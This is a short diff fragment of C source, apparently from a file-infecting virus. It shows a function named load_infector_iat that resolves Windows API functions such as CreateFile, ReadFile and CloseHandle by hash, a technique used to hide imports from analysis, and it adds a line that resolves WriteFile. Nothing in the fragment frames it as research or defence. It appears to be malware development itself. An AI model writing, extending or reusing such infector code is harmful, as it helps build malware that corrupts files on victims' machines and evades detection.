@@ -471,6 +471,7 @@ void load_infector_iat(InfectorIAT *iat)
    iat->createFile = RECAST(CreateFileAHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xbdcac9ce));
    iat->getFileSize = RECAST(GetFileSizeHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x44ed8118));
    iat->readFile = RECAST(ReadFileHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x54fcc943));
+   iat->writeFile = RECAST(WriteFileHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0x7f07c44a));
    iat->closeHandle = RECAST(CloseHandleHeader,get_proc_by_hash(RECAST(PIMAGE_DOS_HEADER,kernel32->DllBase), 0xfaba0065));
    PIMAGE_DOS_HEADER msvcrtModule = RECAST(PIMAGE_DOS_HEADER,iat->loadLibrary("msvcrt.dll"));
    iat->malloc = RECAST(mallocHeader,get_proc_by_hash(msvcrtModule, 0x558c274d));
